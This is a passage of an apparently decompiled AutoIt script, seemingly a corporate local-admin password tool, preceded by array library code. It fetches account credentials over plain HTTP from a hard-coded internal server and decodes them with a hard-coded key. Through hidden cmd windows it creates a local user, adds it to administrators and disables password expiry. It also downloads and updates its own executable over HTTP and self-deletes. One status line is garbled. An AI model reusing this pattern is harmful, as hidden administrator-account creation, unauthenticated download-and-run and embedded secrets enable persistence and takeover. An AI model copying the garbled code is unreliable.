		$aarray[$ie2] = $aarray[$ipivot_left]
		$aarray[$ie4] = $aarray[$ipivot_right]
		Do
			$iless += 1
		Until $aarray[$iless] >= $ipivot_1
		Do
			$igreater -= 1
		Until $aarray[$igreater] <= $ipivot_2
		$k = $iless
		While $k <= $igreater
			$iak = $aarray[$k]
			If $iak < $ipivot_1 Then
				$aarray[$k] = $aarray[$iless]
				$aarray[$iless] = $iak
				$iless += 1
			ElseIf $iak > $ipivot_2 Then
				While $aarray[$igreater] > $ipivot_2
					$igreater -= 1
					If $igreater + 1 = $k Then ExitLoop 2
				WEnd
				If $aarray[$igreater] < $ipivot_1 Then
					$aarray[$k] = $aarray[$iless]
					$aarray[$iless] = $aarray[$igreater]
					$iless += 1
				Else
					$aarray[$k] = $aarray[$igreater]
				EndIf
				$aarray[$igreater] = $iak
				$igreater -= 1
			EndIf
			$k += 1
		WEnd
		$aarray[$ipivot_left] = $aarray[$iless - 1]
		$aarray[$iless - 1] = $ipivot_1
		$aarray[$ipivot_right] = $aarray[$igreater + 1]
		$aarray[$igreater + 1] = $ipivot_2
		__arraydualpivotsort($aarray, $ipivot_left, $iless - 2, True)
		__arraydualpivotsort($aarray, $igreater + 2, $ipivot_right, False)
		If ($iless < $ie1) AND ($ie5 < $igreater) Then
			While $aarray[$iless] = $ipivot_1
				$iless += 1
			WEnd
			While $aarray[$igreater] = $ipivot_2
				$igreater -= 1
			WEnd
			$k = $iless
			While $k <= $igreater
				$iak = $aarray[$k]
				If $iak = $ipivot_1 Then
					$aarray[$k] = $aarray[$iless]
					$aarray[$iless] = $iak
					$iless += 1
				ElseIf $iak = $ipivot_2 Then
					While $aarray[$igreater] = $ipivot_2
						$igreater -= 1
						If $igreater + 1 = $k Then ExitLoop 2
					WEnd
					If $aarray[$igreater] = $ipivot_1 Then
						$aarray[$k] = $aarray[$iless]
						$aarray[$iless] = $ipivot_1
						$iless += 1
					Else
						$aarray[$k] = $aarray[$igreater]
					EndIf
					$aarray[$igreater] = $iak
					$igreater -= 1
				EndIf
				$k += 1
			WEnd
		EndIf
		__arraydualpivotsort($aarray, $iless, $igreater, False)
	Else
		Local $ipivot = $aarray[$ie3]
		$k = $iless
		While $k <= $igreater
			If $aarray[$k] = $ipivot Then
				$k += 1
				ContinueLoop
			EndIf
			$iak = $aarray[$k]
			If $iak < $ipivot Then
				$aarray[$k] = $aarray[$iless]
				$aarray[$iless] = $iak
				$iless += 1
			Else
				While $aarray[$igreater] > $ipivot
					$igreater -= 1
				WEnd
				If $aarray[$igreater] < $ipivot Then
					$aarray[$k] = $aarray[$iless]
					$aarray[$iless] = $aarray[$igreater]
					$iless += 1
				Else
					$aarray[$k] = $ipivot
				EndIf
				$aarray[$igreater] = $iak
				$igreater -= 1
			EndIf
			$k += 1
		WEnd
		__arraydualpivotsort($aarray, $ipivot_left, $iless - 1, True)
		__arraydualpivotsort($aarray, $igreater + 1, $ipivot_right, False)
	EndIf
EndFunc

Func _arrayswap(ByRef $aarray, $iindex_1, $iindex_2, $bcol = False, $istart = -1, $iend = -1)
	If $bcol = Default Then $bcol = False
	If $istart = Default Then $istart = -1
	If $iend = Default Then $iend = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	Local $idim_2 = UBound($aarray, $ubound_columns) - 1
	If $idim_2 = -1 Then
		$bcol = False
		$istart = -1
		$iend = -1
	EndIf
	If $istart > $iend Then Return SetError(5, 0, -1)
	If $bcol Then
		If $iindex_1 < 0 OR $iindex_2 > $idim_2 Then Return SetError(3, 0, -1)
		If $istart = -1 Then $istart = 0
		If $iend = -1 Then $iend = $idim_1
	Else
		If $iindex_1 < 0 OR $iindex_2 > $idim_1 Then Return SetError(3, 0, -1)
		If $istart = -1 Then $istart = 0
		If $iend = -1 Then $iend = $idim_2
	EndIf
	Local $vtmp
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			$vtmp = $aarray[$iindex_1]
			$aarray[$iindex_1] = $aarray[$iindex_2]
			$aarray[$iindex_2] = $vtmp
		Case 2
			If $istart < -1 OR $iend < -1 Then Return SetError(4, 0, -1)
			If $bcol Then
				If $istart > $idim_1 OR $iend > $idim_1 Then Return SetError(4, 0, -1)
				For $j = $istart To $iend
					$vtmp = $aarray[$j][$iindex_1]
					$aarray[$j][$iindex_1] = $aarray[$j][$iindex_2]
					$aarray[$j][$iindex_2] = $vtmp
				Next
			Else
				If $istart > $idim_2 OR $iend > $idim_2 Then Return SetError(4, 0, -1)
				For $j = $istart To $iend
					$vtmp = $aarray[$iindex_1][$j]
					$aarray[$iindex_1][$j] = $aarray[$iindex_2][$j]
					$aarray[$iindex_2][$j] = $vtmp
				Next
			EndIf
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc

Func _arraytoclip(Const ByRef $aarray, $sdelim_col = "|", $istart_row = -1, $iend_row = -1, $sdelim_row = @CRLF, $istart_col = -1, $iend_col = -1)
	Local $sresult = _arraytostring($aarray, $sdelim_col, $istart_row, $iend_row, $sdelim_row, $istart_col, $iend_col)
	If @error Then Return SetError(@error, 0, 0)
	If ClipPut($sresult) Then Return 1
	Return SetError(-1, 0, 0)
EndFunc

Func _arraytostring(Const ByRef $aarray, $sdelim_col = "|", $istart_row = -1, $iend_row = -1, $sdelim_row = @CRLF, $istart_col = -1, $iend_col = -1)
	If $sdelim_col = Default Then $sdelim_col = "|"
	If $sdelim_row = Default Then $sdelim_row = @CRLF
	If $istart_row = Default Then $istart_row = -1
	If $iend_row = Default Then $iend_row = -1
	If $istart_col = Default Then $istart_col = -1
	If $iend_col = Default Then $iend_col = -1
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $istart_row = -1 Then $istart_row = 0
	If $iend_row = -1 Then $iend_row = $idim_1
	If $istart_row < -1 OR $iend_row < -1 Then Return SetError(3, 0, -1)
	If $istart_row > $idim_1 OR $iend_row > $idim_1 Then Return SetError(3, 0, "")
	If $istart_row > $iend_row Then Return SetError(4, 0, -1)
	Local $sret = ""
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			For $i = $istart_row To $iend_row
				$sret &= $aarray[$i] & $sdelim_col
			Next
			Return StringTrimRight($sret, StringLen($sdelim_col))
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $istart_col = -1 Then $istart_col = 0
			If $iend_col = -1 Then $iend_col = $idim_2
			If $istart_col < -1 OR $iend_col < -1 Then Return SetError(5, 0, -1)
			If $istart_col > $idim_2 OR $iend_col > $idim_2 Then Return SetError(5, 0, -1)
			If $istart_col > $iend_col Then Return SetError(6, 0, -1)
			For $i = $istart_row To $iend_row
				For $j = $istart_col To $iend_col
					$sret &= $aarray[$i][$j] & $sdelim_col
				Next
				$sret = StringTrimRight($sret, StringLen($sdelim_col)) & $sdelim_row
			Next
			Return StringTrimRight($sret, StringLen($sdelim_row))
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return 1
EndFunc

Func _arraytranspose(ByRef $aarray)
	Switch UBound($aarray, 0)
		Case 0
			Return SetError(2, 0, 0)
		Case 1
			Local $atemp[1][UBound($aarray)]
			For $i = 0 To UBound($aarray) - 1
				$atemp[0][$i] = $aarray[$i]
			Next
			$aarray = $atemp
		Case 2
			Local $idim_1 = UBound($aarray, 1), $idim_2 = UBound($aarray, 2)
			If $idim_1 <> $idim_2 Then
				Local $atemp[$idim_2][$idim_1]
				For $i = 0 To $idim_1 - 1
					For $j = 0 To $idim_2 - 1
						$atemp[$j][$i] = $aarray[$i][$j]
					Next
				Next
				$aarray = $atemp
			Else
				Local $velement
				For $i = 0 To $idim_1 - 1
					For $j = $i + 1 To $idim_2 - 1
						$velement = $aarray[$i][$j]
						$aarray[$i][$j] = $aarray[$j][$i]
						$aarray[$j][$i] = $velement
					Next
				Next
			EndIf
		Case Else
			Return SetError(1, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func _arraytrim(ByRef $aarray, $itrimnum, $idirection = 0, $istart = 0, $iend = 0, $isubitem = 0)
	If $idirection = Default Then $idirection = 0
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $isubitem = Default Then $isubitem = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $iend = 0 Then $iend = $idim_1
	If $istart > $iend Then Return SetError(3, 0, -1)
	If $istart < 0 OR $iend < 0 Then Return SetError(3, 0, -1)
	If $istart > $idim_1 OR $iend > $idim_1 Then Return SetError(3, 0, -1)
	If $istart > $iend Then Return SetError(4, 0, -1)
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $idirection Then
				For $i = $istart To $iend
					$aarray[$i] = StringTrimRight($aarray[$i], $itrimnum)
				Next
			Else
				For $i = $istart To $iend
					$aarray[$i] = StringTrimLeft($aarray[$i], $itrimnum)
				Next
			EndIf
		Case 2
			Local $idim_2 = UBound($aarray, $ubound_columns) - 1
			If $isubitem < 0 OR $isubitem > $idim_2 Then Return SetError(5, 0, -1)
			If $idirection Then
				For $i = $istart To $iend
					$aarray[$i][$isubitem] = StringTrimRight($aarray[$i][$isubitem], $itrimnum)
				Next
			Else
				For $i = $istart To $iend
					$aarray[$i][$isubitem] = StringTrimLeft($aarray[$i][$isubitem], $itrimnum)
				Next
			EndIf
		Case Else
			Return SetError(2, 0, 0)
	EndSwitch
	Return 1
EndFunc

Func _arrayunique(Const ByRef $aarray, $icolumn = 0, $ibase = 0, $icase = 0, $icount = $arrayunique_count, $iinttype = $arrayunique_auto)
	If $icolumn = Default Then $icolumn = 0
	If $ibase = Default Then $ibase = 0
	If $icase = Default Then $icase = 0
	If $icount = Default Then $icount = $arrayunique_count
	If UBound($aarray, $ubound_rows) = 0 Then Return SetError(1, 0, 0)
	Local $idims = UBound($aarray, $ubound_dimensions), $inumcolumns = UBound($aarray, $ubound_columns)
	If $idims > 2 Then Return SetError(2, 0, 0)
	If $ibase < 0 OR $ibase > 1 OR (NOT IsInt($ibase)) Then Return SetError(3, 0, 0)
	If $icase < 0 OR $icase > 1 OR (NOT IsInt($icase)) Then Return SetError(3, 0, 0)
	If $icount < 0 OR $icount > 1 OR (NOT IsInt($icount)) Then Return SetError(4, 0, 0)
	If $iinttype < 0 OR $iinttype > 4 OR (NOT IsInt($iinttype)) Then Return SetError(5, 0, 0)
	If $icolumn < 0 OR ($inumcolumns = 0 AND $icolumn > 0) OR ($inumcolumns > 0 AND $icolumn >= $inumcolumns) Then Return SetError(6, 0, 0)
	If $iinttype = $arrayunique_auto Then
		Local $vfirstelem = (($idims = 1) ? ($aarray[$ibase]) : ($aarray[$icolumn][$ibase]))
		If IsInt($vfirstelem) Then
			Switch VarGetType($vfirstelem)
				Case "Int32"
					$iinttype = $arrayunique_force32
				Case "Int64"
					$iinttype = $arrayunique_force64
			EndSwitch
		Else
			$iinttype = $arrayunique_force32
		EndIf
	EndIf
	ObjEvent("AutoIt.Error", "__ArrayUnique_AutoErrFunc")
	Local $odictionary = ObjCreate("Scripting.Dictionary")
	$odictionary.comparemode = Number(NOT $icase)
	Local $velem, $stype, $vkey, $bcomerror = False
	For $i = $ibase To UBound($aarray) - 1
		If $idims = 1 Then
			$velem = $aarray[$i]
		Else
			$velem = $aarray[$i][$icolumn]
		EndIf
		Switch $iinttype
			Case $arrayunique_force32
				$odictionary.item($velem)
				If @error Then
					$bcomerror = True
					ExitLoop
				EndIf
			Case $arrayunique_force64
				$stype = VarGetType($velem)
				If $stype = "Int32" Then
					$bcomerror = True
					ExitLoop
				EndIf
				$vkey = "#" & $stype & "#" & String($velem)
				If NOT $odictionary.item($vkey) Then
					$odictionary($vkey) = $velem
				EndIf
			Case $arrayunique_match
				$stype = VarGetType($velem)
				If StringLeft($stype, 3) = "Int" Then
					$vkey = "#Int#" & String($velem)
				Else
					$vkey = "#" & $stype & "#" & String($velem)
				EndIf
				If NOT $odictionary.item($vkey) Then
					$odictionary($vkey) = $velem
				EndIf
			Case $arrayunique_distinct
				$vkey = "#" & VarGetType($velem) & "#" & String($velem)
				If NOT $odictionary.item($vkey) Then
					$odictionary($vkey) = $velem
				EndIf
		EndSwitch
	Next
	Local $avalues, $j = 0
	If $bcomerror Then
		Return SetError(7, 0, 0)
	ElseIf $iinttype <> $arrayunique_force32 Then
		Local $avalues[$odictionary.count]
		For $vkey In $odictionary.keys()
			$avalues[$j] = $odictionary($vkey)
			If StringLeft($vkey, 5) = "#Ptr#" Then
				$avalues[$j] = Ptr($avalues[$j])
			EndIf
			$j += 1
		Next
	Else
		$avalues = $odictionary.keys()
	EndIf
	If $icount Then
		_arrayinsert($avalues, 0, $odictionary.count)
	EndIf
	Return $avalues
EndFunc

Func _array1dtohistogram($aarray, $isizing = 100)
	If UBound($aarray, 0) > 1 Then Return SetError(1, 0, "")
	$isizing = $isizing * 8
	Local $t, $n, $imin = 0, $imax = 0, $ioffset = 0
	For $i = 0 To UBound($aarray) - 1
		$t = $aarray[$i]
		$t = IsNumber($t) ? Round($t) : 0
		If $t < $imin Then $imin = $t
		If $t > $imax Then $imax = $t
	Next
	Local $irange = Int(Round(($imax - $imin) / 8)) * 8
	Local $ispaceratio = 4
	For $i = 0 To UBound($aarray) - 1
		$t = $aarray[$i]
		If $t Then
			$n = Abs(Round(($isizing * $t) / $irange) / 8)
			$aarray[$i] = ""
			If $t > 0 Then
				If $imin Then
					$ioffset = Int(Abs(Round(($isizing * $imin) / $irange) / 8) / 8 * $ispaceratio)
					$aarray[$i] = __array_stringrepeat(ChrW(32), $ioffset)
				EndIf
			Else
				If $imin <> $t Then
					$ioffset = Int(Abs(Round(($isizing * ($t - $imin)) / $irange) / 8) / 8 * $ispaceratio)
					$aarray[$i] = __array_stringrepeat(ChrW(32), $ioffset)
				EndIf
			EndIf
			$aarray[$i] &= __array_stringrepeat(ChrW(9608), Int($n / 8))
			$n = Mod($n, 8)
			If $n > 0 Then $aarray[$i] &= ChrW(9608 + 8 - $n)
			$aarray[$i] &= " " & $t
		Else
			$aarray[$i] = ""
		EndIf
	Next
	Return $aarray
EndFunc

Func __array_stringrepeat($sstring, $irepeatcount)
	$irepeatcount = Int($irepeatcount)
	If StringLen($sstring) < 1 OR $irepeatcount <= 0 Then Return SetError(1, 0, "")
	Local $sresult = ""
	While $irepeatcount > 1
		If BitAND($irepeatcount, 1) Then $sresult &= $sstring
		$sstring &= $sstring
		$irepeatcount = BitShift($irepeatcount, 1)
	WEnd
	Return $sstring & $sresult
EndFunc

Func __array_exeterinternal(ByRef $aarray, $istart, $isize, $sdelimiter, ByRef $aidx, ByRef $aresult, ByRef $icount)
	If $istart == $isize - 1 Then
		For $i = 0 To $isize - 1
			$aresult[$icount] &= $aarray[$aidx[$i]] & $sdelimiter
		Next
		If $sdelimiter <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], StringLen($sdelimiter))
		$icount += 1
	Else
		Local $itemp
		For $i = $istart To $isize - 1
			$itemp = $aidx[$i]
			$aidx[$i] = $aidx[$istart]
			$aidx[$istart] = $itemp
			__array_exeterinternal($aarray, $istart + 1, $isize, $sdelimiter, $aidx, $aresult, $icount)
			$aidx[$istart] = $aidx[$i]
			$aidx[$i] = $itemp
		Next
	EndIf
EndFunc

Func __array_combinations($in, $ir)
	Local $i_total = 1
	For $i = $ir To 1 Step -1
		$i_total *= ($in / $i)
		$in -= 1
	Next
	Return Round($i_total)
EndFunc

Func __array_getnext($in, $ir, ByRef $ileft, $itotal, ByRef $aidx)
	If $ileft == $itotal Then
		$ileft -= 1
		Return 
	EndIf
	Local $i = $ir - 1
	While $aidx[$i] == $in - $ir + $i
		$i -= 1
	WEnd
	$aidx[$i] += 1
	For $j = $i + 1 To $ir - 1
		$aidx[$j] = $aidx[$i] + $j - $i
	Next
	$ileft -= 1
EndFunc

Func __array_minmaxindex(Const ByRef $aarray, $icompnumeric, $istart, $iend, $isubitem, $fucomparison)
	If $icompnumeric = Default Then $icompnumeric = 0
	If $icompnumeric <> 1 Then $icompnumeric = 0
	If $istart = Default Then $istart = 0
	If $iend = Default Then $iend = 0
	If $isubitem = Default Then $isubitem = 0
	If NOT IsArray($aarray) Then Return SetError(1, 0, -1)
	Local $idim_1 = UBound($aarray, $ubound_rows) - 1
	If $idim_1 < 0 Then Return SetError(1, 0, -1)
	If $iend = -1 Then $iend = $idim_1
	If $istart = -1 Then $istart = 0
	If $istart < -1 OR $iend < -1 Then Return SetError(3, 0, -1)
	If $istart > $idim_1 OR $iend > $idim_1 Then Return SetError(3, 0, -1)
	If $istart > $iend Then Return SetError(4, 0, -1)
	If $idim_1 < 0 Then Return SetError(5, 0, -1)
	Local $imaxminindex = $istart
	Switch UBound($aarray, $ubound_dimensions)
		Case 1
			If $icompnumeric Then
				For $i = $istart To $iend
					If $fucomparison(Number($aarray[$i]), Number($aarray[$imaxminindex])) Then $imaxminindex = $i
				Next
			Else
				For $i = $istart To $iend
					If $fucomparison($aarray[$i], $aarray[$imaxminindex]) Then $imaxminindex = $i
				Next
			EndIf
		Case 2
			If $isubitem < 0 OR $isubitem > UBound($aarray, $ubound_columns) - 1 Then Return SetError(6, 0, -1)
			If $icompnumeric Then
				For $i = $istart To $iend
					If $fucomparison(Number($aarray[$i][$isubitem]), Number($aarray[$imaxminindex][$isubitem])) Then $imaxminindex = $i
				Next
			Else
				For $i = $istart To $iend
					If $fucomparison($aarray[$i][$isubitem], $aarray[$imaxminindex][$isubitem]) Then $imaxminindex = $i
				Next
			EndIf
		Case Else
			Return SetError(2, 0, -1)
	EndSwitch
	Return $imaxminindex
EndFunc

Func __array_greaterthan($vvalue1, $vvalue2)
	Return $vvalue1 > $vvalue2
EndFunc

Func __array_lessthan($vvalue1, $vvalue2)
	Return $vvalue1 < $vvalue2
EndFunc

Func __arrayunique_autoerrfunc()
EndFunc

Func cryptdata($saopdata, $stype)
	Local $encodekey = "LenovoMS@CryptPassword"
	Local $hxstr1 = "HX"
	Local $hxstr2 = "GPE"
	Local $hxstr3 = "0x"
	Local $xornumber = "22"
	_crypt_startup()
	If $stype = "eA" OR $stype = 2 Then
		Local $encodea = xortocode($saopdata, $xornumber)
		Local $encodeadata = _base64encode($encodea)
		Return $encodeadata
	ElseIf $stype = "dA" OR $stype = 1 Then
		Local $decodea = _base64decode($saopdata)
		Local $decodeadata = xordecode($decodea, $xornumber)
		Return $decodeadata
	ElseIf $stype = "eP" OR $stype = 4 Then
		Local $encode1 = encodedata($encodekey, $saopdata, $hxstr1, $hxstr2, $hxstr3)
		Local $encode2 = xortocode($encode1, $xornumber)
		Local $encodedata = _base64encode($encode2)
		Return $encodedata
	ElseIf $stype = "dP" OR $stype = 3 Then
		Local $decode1 = _base64decode($saopdata)
		Local $decode2 = xordecode($decode1, $xornumber)
		Local $decodedata = decodedata($encodekey, $decode2, $hxstr1, $hxstr2, $hxstr3)
		Return $decodedata
	Else
		Return 0
	EndIf
	_crypt_destroykey($encodekey)
	_crypt_shutdown()
EndFunc

Func encodedata($g_hkey, $sdata, $hx1, $hx2, $hx3)
	Local $bencrypted = _crypt_encryptdata($sdata, $g_hkey, $calg_aes_256)
	Local $bencrypted1 = _crypt_encryptdata($hx1 & $bencrypted & $hx2, $g_hkey, $calg_rc4)
	Local $stle = StringTrimLeft($bencrypted1, 2)
	Local $ste = STRINGREVERSE($stle)
	Return $ste
EndFunc

Func decodedata($g_hkey, $sdata, $hx1, $hx2, $hx3)
	Local $std = STRINGREVERSE($sdata)
	Local $stld = $hx3 & $std
	Local $dd = _crypt_decryptdata($stld, $g_hkey, $calg_rc4)
	Local $sr1 = StringReplace(BinaryToString($dd), $hx1, "")
	Local $sr2 = StringReplace($sr1, $hx2, "")
	Local $dd1 = _crypt_decryptdata($sr2, $g_hkey, $calg_aes_256)
	Local $sdd1 = BinaryToString($dd1)
	Return $sdd1
EndFunc

Func xortocode($sdata, $snumber)
	Local $staa = StringToASCIIArray($sdata)
	Local $am = StringLen($sdata) - 1
	For $i = 0 To $am Step +1
		$staa[$i] = BitXOR($staa[$i], $snumber)
	Next
	Local $sfaa = StringFromASCIIArray($staa)
	Return $sfaa
EndFunc

Func xordecode($sdata, $snumber)
	Local $staa = StringToASCIIArray($sdata)
	Local $am = StringLen($sdata) - 1
	For $i = 0 To $am Step +1
		$staa[$i] = BitXOR($staa[$i], $snumber)
	Next
	Local $sfaa = StringFromASCIIArray($staa)
	Return $sfaa
EndFunc

Func _base64encode($sdata)
	Local $oxml = ObjCreate("Msxml2.DOMDocument")
	If NOT IsObj($oxml) Then
		SetError(1, 1, 0)
	EndIf
	Local $oelement = $oxml.createelement("b64")
	If NOT IsObj($oelement) Then
		SetError(2, 2, 0)
	EndIf
	$oelement.datatype = "bin.base64"
	$oelement.nodetypedvalue = Binary($sdata)
	Local $sreturn = $oelement.text
	If StringLen($sreturn) = 0 Then
		SetError(3, 3, 0)
	EndIf
	Return $sreturn
EndFunc

Func _base64decode($sdata)
	Local $oxml = ObjCreate("Msxml2.DOMDocument")
	If NOT IsObj($oxml) Then
		SetError(1, 1, 0)
	EndIf
	Local $oelement = $oxml.createelement("b64")
	If NOT IsObj($oelement) Then
		SetError(2, 2, 0)
	EndIf
	$oelement.datatype = "bin.base64"
	$oelement.text = $sdata
	Local $sreturn = BinaryToString($oelement.nodetypedvalue, 4)
	If StringLen($sreturn) = 0 Then
		SetError(3, 3, 0)
	EndIf
	Return $sreturn
EndFunc

Func getjsondata($jsondata, $tvalue)
	Local $redata
	Local $jsondata0 = StringReplace($jsondata, '"data":', "")
	Local $jsondata1 = StringReplace($jsondata0, '"', "")
	Local $jsondata2 = StringReplace($jsondata1, "{", "")
	Local $jsondata3 = StringReplace($jsondata2, "}", "")
	Local $jsondataarray = StringSplit($jsondata3, ",")
	For $velement In $jsondataarray
		Local $stv = StringInStr($velement, $tvalue)
		Local $sarray2 = StringInStr($velement, ":")
		Local $sarraymid1 = StringInStr($velement, "[")
		Local $sarraymid2 = StringInStr($velement, "]")
		If $stv > 0 Then
			If $sarraymid1 > 0 Then
				$velement = StringReplace($velement, "[", "")
				_arrayadd($redata, $velement)
				_arraydisplay($redata, "1D - Single")
			EndIf
			If $sarray2 > 0 Then
				$velement = StringReplace($velement, ":", "")
				$redata = StringMid($velement, $sarray2)
				Return $redata
			EndIf
		EndIf
	Next
	Return 0
EndFunc

Global $opdetail = ""
Global $wpath = "\\byd.com\netlogon\LocalAdminPWD"
Global $wpweini = $wpath & "\pwe.ini"
Global $laccount = "dG9ySXpzeHlgeQ=="
Global $srvip = "192.168.101.36"
Global $appversionapi_add = "http://" & $srvip & ":8080/api/tool/version?value=" & $laccount
Global $newappversion = getserverappnewversion($appversionapi_add)
Global $vaccount = getjsondata($newappversion, "name")
Global $vpws = getjsondata($newappversion, "value")
$vaccount = cryptdata($vaccount, "dA")
$vpws = cryptdata($vpws, "dP")
Local $updatarunappname = "byd_lenovo_pwd.exe"
Local $updataapppathname = "\byd_lenovo_pwd.exe"
Local $appdownload_add = "http://" & $srvip & ":8080/api/tool/file?file=" & $updatarunappname
Local $appdownloadpath = @AppDataDir & "\SYPWPG\updata"
Local $appdownloadallpath = $appdownloadpath & $updataapppathname
Local $appsrvname = "BLPWUpdate"
Local $appsrvversion = "1.0.0"
Local $appvserioninfo = '{"name":"' & $appsrvname & '","value":"' & $appsrvversion & '"}'
$appversionapi_add = "http://192.168.101.36:8080/api/tool/version?value=" & $appsrvname
Global $errorhit = "错误"
Global $runhit = "提示"
Local $rpws = ""
Local $cla = ""
Local $cavinfo = ""
Local $gfrpw = ""
$cavinfo = checkappversion()
If StringIsInt($cavinfo) = 1 Then
	If $cavinfo > 1 Then
		$cavinfo = "更新成功成-" & $cavinfo
	ElseIf $cavinfo = 1 Then
		$cavinfo = "已经是最新版本-" & $cavinfo
	ElseIf $cavinfo = 0 Then
		$cavinfo = "无法连接服务器-" & $cavinfo
	Else
		$cavinfo = "更新执行异常-" & $cavinfo
	EndIf
Else
	$cavinfo = "更新数据异常-" & $cavinfo
EndIf
$gfrpw = getfileread($wpweini)
If $gfrpw <> "" Then
	If StringIsInt($gfrpw) = 0 Then
		$rpws = cryptdata($gfrpw, "dP")
		If $rpws <> "" Then
			If StringIsInt($rpws) = 1 Then
				$cla = svrpwupdata($vaccount, $vpws)
				$gfrpw = "读取异常-" & $gfrpw
			Else
				$cla = createlocalaccount($vaccount, $rpws)
				If StringIsInt($cla) = 1 Then
					If $cla = 1 Then
						$cla = "已经是最新密码-" & $cla
					ElseIf $cla = 2 Then
						$cla = "重置密码成功-" & $cla
					Else
						$cla = "重置密码失败-" & $cla & $rpws
					EndIf
				Else
					$cla = "创建本地账户异常-" & $cla
				EndIf
				$gfrpw = "读取成功-" & $gfrpw
			EndIf
		Else
			$cla = svrpwupdata($vaccount, $vpws)
			$gfrpw = "读取异常-" & $gfrpw
		EndIf
	Else
		$cla = svrpwupdata($vaccount, $vpws)
		$gfrpw = "读取失败-" & $gfrpw
	EndIf
Else
	$cla = svrpwupdata($vaccount, $vpws)
	$gfrpw = "读取失败-" & $gfrpw
EndIf
$opdetail = "检测版本结果󖠢 & $cavinfo & " " & "读取密码结果󖠢 & $gfrpw & " " & "重置账户结果󖠢 & $cla
siopupdate($opdetail)
delselfapp()

Func svrpwupdata($aaccount, $apassword)
	Local $returninfo = ""
	If $apassword <> "" Then
		If StringIsInt($apassword) = 1 Then
			If $apassword = 0 Then
				$returninfo = "获取服务器密码失败-" & $apassword
			Else
				$returninfo = "获取服务器密码异常-" & $apassword
			EndIf
		Else
			$returninfo = createlocalaccount($aaccount, $apassword)
			If StringIsInt($returninfo) = 1 Then
				If $returninfo = 1 Then
					$returninfo = "已经是最新密码-" & $returninfo
				ElseIf $returninfo = 2 Then
					$returninfo = "重置密码成功-" & $returninfo
				Else
					$returninfo = "重置密码失败-" & $returninfo & $apassword
				EndIf
			Else
				$returninfo = "创建本地账户异常-" & $returninfo
			EndIf
		EndIf
	Else
		$returninfo = "获取服务器密码异常-" & $apassword
	EndIf
	Return $returninfo
EndFunc

Func getfileread($readfilepath)
	Local $wopw = ""
	Local $rpw = ""
	Local $fepwini = FileExists($readfilepath)
	If $fepwini = 1 Then
		$wopw = FileOpen($readfilepath, $fo_read)
		If $wopw > 0 Then
			$rpw = FileRead($wopw)
			FileClose($wopw)
			If $rpw <> "" Then
				Return $rpw
			Else
				Return 0
			EndIf
		Else
			Return 0
		EndIf
	Else
		Return 0
	EndIf
EndFunc

Func createlocalaccount($z2ra30b49, $z2ra30b4b)
	Local $rinfo = RunAs($z2ra30b49, @ComputerName, $z2ra30b4b, 1, "cmd.exe /c", "", @SW_HIDE)
	If $rinfo <> 0 Then
		Return 1
	Else
		$rw1 = RunWait('cmd.exe /c %windir%\system32\net user "' & $z2ra30b49 & '" "' & $z2ra30b4b & '" /add', "", @SW_HIDE)
		$rw2 = RunWait('cmd.exe /c %windir%\system32\net user "' & $z2ra30b49 & '" "' & $z2ra30b4b & '" ', "", @SW_HIDE)
		$rw3 = RunWait('cmd.exe /c %windir%\system32\net localgroup users "' & $z2ra30b49 & '" /del', "", @SW_HIDE)
		$rw4 = RunWait('cmd.exe /c %windir%\system32\net localgroup administrators "' & $z2ra30b49 & '" /add', "", @SW_HIDE)
		$rw5 = RunWait('cmd.exe /c %windir%\system32\net user "' & $z2ra30b49 & '" /active:yes', "", @SW_HIDE)
		$rw6 = RunWait('cmd.exe /c wmic useraccount where Name="' & $z2ra30b49 & '" set PasswordExpires=false', "", @SW_HIDE)
		$rinfo = RunAs($z2ra30b49, @ComputerName, $z2ra30b4b, 1, "cmd.exe /c", "", @SW_HIDE)
		If $rinfo <> 0 Then
			Return 2
		Else
			Return 0
		EndIf
	EndIf
EndFunc

Func checkappversion()
	Local $srvpinginfo = Ping($srvip, 15000)
	If $srvpinginfo = 0 Then
		Return 0
	EndIf
	$newappversion = getserverappnewversion($appversionapi_add)
	$connserverstat = StringInStr($newappversion, '"code":200')
	If $connserverstat > 0 Then
		If StringInStr($newappversion, $appvserioninfo) <> 0 Then
			Return 1
		ElseIf StringInStr($newappversion, $appvserioninfo) = 0 Then
			FileDelete($appdownloadallpath)
			DirCreate($appdownloadpath)
			$updataappex = updataapp($appdownload_add, $appdownloadallpath)
			If $updataappex = 1 Then
				dellegacyapp($appdownloadpath, $updataapppathname)
				Return 2
			Else
				Return 0
			EndIf
		Else
			FileDelete($appdownloadallpath)
			DirCreate($appdownloadpath)
			$updataappex = updataapp($appdownload_add, $appdownloadallpath)
			If $updataappex = 1 Then
				dellegacyapp($appdownloadpath, $updataapppathname)
				Return 2
			Else
				Return 0
			EndIf
		EndIf
	Else
		Return 0
	EndIf
	Return 0
EndFunc

Func updataapp($appdlurl, $dlpath)
	Local $hdownload = InetGet($appdlurl, $dlpath, $inet_forcereload, $inet_downloadbackground)
	Local $ibytessize = InetGetInfo($hdownload, $inet_downloadread)
	Local $itotalbytessize = InetGetInfo($hdownload, $inet_downloadsize)
	Local $ifileex = FileExists($dlpath)
	Local $ifilesize = FileGetSize($dlpath)
	Local $idownloadiscomplete = InetGetInfo($hdownload, $inet_downloadcomplete)
	For $ipsva = 1 To 100 Step +0
		$ibytessize = InetGetInfo($hdownload, $inet_downloadread)
		$itotalbytessize = InetGetInfo($hdownload, $inet_downloadsize)
		$ibytessizetokb = Round($ibytessize / 1024, 2)
		$ifileex = FileExists($dlpath)
		$ifilesize = FileGetSize($dlpath)
		$idownloadiscomplete = InetGetInfo($hdownload, $inet_downloadcomplete)
		If $ipsva <= 80 Then
			$ipsva = $ipsva + 1
		ElseIf $ipsva > 80 AND $ipsva < 95 Then
			$ipsva = $ipsva + 1
